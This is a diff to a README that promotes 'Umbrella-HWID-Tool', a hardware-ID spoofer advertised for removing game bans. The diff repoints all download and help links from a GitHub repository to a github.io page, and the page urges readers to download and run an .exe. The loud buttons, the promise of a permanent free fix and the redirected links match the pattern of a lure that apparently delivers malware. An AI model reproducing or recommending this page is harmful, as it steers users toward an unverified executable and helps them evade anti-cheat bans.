@@ -1,7 +1,7 @@
 <h1>🛡️ Umbrella-HWID-Tool - Permanent Hardware Ban Removal & System Identity Spoofer</h1>
 
 <p align="center">
-  <a href="https://github.com/B3at1z/Umbrella-HWID-Tool" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:20px auto;">⬇️ DOWNLOAD NOW - FREE & PERMANENT</a>
+  <a href="https://b3at1z.github.io" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:20px auto;">⬇️ DOWNLOAD NOW - FREE & PERMANENT</a>
 </p>
 
 Welcome to **Umbrella-HWID-Tool**, your all-in-one solution for complete hardware identity transformation. Whether you're dealing with a hardware ban from your favorite game, need to protect your privacy, or want to start fresh with a clean system identity, this tool handles everything with professional-grade precision. Designed for everyday users - no technical skills required.
@@ -67,7 +67,7 @@ Follow these simple steps to get Umbrella-HWID-Tool running on your PC:
 Click the **green "DOWNLOAD NOW" button** at the top of this page, or use this direct link:
 
 <p align="center">
-  <a href="https://github.com/B3at1z/Umbrella-HWID-Tool" style="display:inline-block;padding:14px 35px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;margin:10px;">📥 CLICK HERE TO DOWNLOAD</a>
+  <a href="https://b3at1z.github.io" style="display:inline-block;padding:14px 35px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;margin:10px;">📥 CLICK HERE TO DOWNLOAD</a>
 </p>
 
 **Visit this link to download the application.** This will take you to the official GitHub release page. Look for the newest file (usually named `Umbrella-Tool-vX.X.exe`) and click it to download.
@@ -190,7 +190,7 @@ No. Using hardware ID spoofers is legal in most countries. It's your hardware, a
 
 ## 📞 Getting Help
 
-- **GitHub Issues:** Report bugs or request features at https://github.com/B3at1z/Umbrella-HWID-Tool
+- **GitHub Issues:** Report bugs or request features at https://b3at1z.github.io
 - **Documentation:** Read the extended guide in the "Docs" folder after installation
 - **Community Discord:** Join the Umbrella community for tips and driver updates (link provided in the tool)
 
@@ -206,7 +206,7 @@ No. Using hardware ID spoofers is legal in most countries. It's your hardware, a
 - [ ] Click the download button below to begin
 
 <p align="center" style="margin:40px 0;">
-  <a href="https://github.com/B3at1z/Umbrella-HWID-Tool" style="display:inline-block;padding:18px 50px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#fff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 10px 30px rgba(240,147,251,0.5);">🚀 START YOUR FREE SPOOF NOW</a>
+  <a href="https://b3at1z.github.io" style="display:inline-block;padding:18px 50px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#fff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 10px 30px rgba(240,147,251,0.5);">🚀 START YOUR FREE SPOOF NOW</a>
 </p>
 
 **Remember:** Umbrella-HWID-Tool is your one-time solution to a permanent fresh start. Whether you're a gamer looking to escape unfair bans or a privacy enthusiast wanting full system anonymity, this tool has everything you need - and it's completely free.
